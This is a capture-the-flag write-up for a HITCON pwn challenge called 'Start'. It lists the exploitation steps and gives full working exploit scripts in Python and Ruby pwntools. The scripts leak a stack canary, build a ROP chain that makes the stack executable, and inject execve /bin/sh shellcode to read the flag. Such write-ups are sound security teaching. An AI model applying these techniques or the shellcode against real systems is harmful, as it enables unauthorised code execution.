# Pwn - Start

> Writeup by feignix (Paras Chetal)


## Summary

### Binary: [start](start)
### Protections: Canary, NX, ASLR

### Steps:

* Leak canary
* Overwrite ret addr with ROP chain
* In the ROP chain:
  * Set global value stack_prot to 7
  * Call dl_make_stack_exec with libc_stack_end as argument to make stack executable (ref: http://radare.today/posts/defeating-baby_rop-with-radare2/ )
  * Call read again to read execve /bin/sh shellcode onto the stack
  * ret to the shellcode
* Send 'exit\n' to cause ROP chain to be executed

### [Exploit](exp.py)
```from pwn import *
context.terminal = 'terminator'
context.log_level = 'debug'

p = remote('127.0.0.1', 31338)
#gdb.attach(p)
#pause()

p.sendline('A'*24)
#pause()

p.recvuntil('A'*24)

currupted_canary = p.recv(8)
fixed_canary = '\x00' + currupted_canary[1::]

corr_y = p.recv(3)
y = corr_y + '\x00'*5

p.recvline()

p.sendline('A'*63)
o = p.recv(1024).split('\n')[1]
shellcode_addr = o+"\x00"*2

mr = p64(0x00000000004683b0)
mrr = p64(0x0000000000417b21)
prdxret = p64(0x0000000000443776)
stack_prot = p64(0x00000000006CBFE0)

payload = 'B'*24 + fixed_canary + y + prdxret + stack_prot + mr + mrr

prdiret = p64(0x00000000004005d5)
libc_stack_end = p64(0x0000000006CBF90)
dl_make_stack_exec = p64(0x0000000004768A0)

payload += prdiret + libc_stack_end + dl_make_stack_exec


nbytes = p64(27)
fdes = p64(0)
read = p64(0x000000000440300)
prsiret = p64(0x00000000004017f7)
prdiret = p64(0x00000000004005d5)

payload += prdxret + nbytes + prsiret + shellcode_addr + prdiret + p64(0) + read + shellcode_addr

p.sendline(payload)

p.sendline('exit')

binsh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendline(binsh)

p.interactive()
```

But they wanted a pwntools-ruby script (one line), so sent:
`z = Sock.new "127.0.0.1", 31338;z.sendline "A"*24;z.recvuntil "A"*24;cc = z.recv 8;fixed_canary = "\x00" + cc[1..-1];c_rbp = z.recv 3;rbp = c_rbp + "\x00"*5;z.recvline;z.sendline "A"*63;o = z.recv(1024).split[1];saddr = u64(o+"\x00"*2)+0x100;mr = p64(0x4683b0);mrr = p64(0x417b21);prdxret = p64(0x443776);sp = p64(0x6CBFE0);pd = 'B'*24 + fixed_canary + rbp + prdxret + sp + mr + mrr;prdiret = p64(0x4005d5);libc_stack_end = p64(0x6CBF90);dl_make_stack_exec = p64(0x4768A0);pd += prdiret + libc_stack_end + dl_make_stack_exec;nbytes = p64(27);fdes = p64(0);read = p64(0x440300);prsiret = p64(0x4017f7);prdiret = p64(0x4005d5);pd += prdxret + nbytes + prsiret + p64(saddr) + prdiret + p64(0) + read + p64(saddr);z.sendline pd;p z.recvline;z.sendline 'exit';binsh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";z.sendline binsh;z.sendline "cat home/start/flag";sleep(1);print z.recv 1024;
`
and got the flag: `hitcon{thanks_for_using_pwntools-ruby:D}`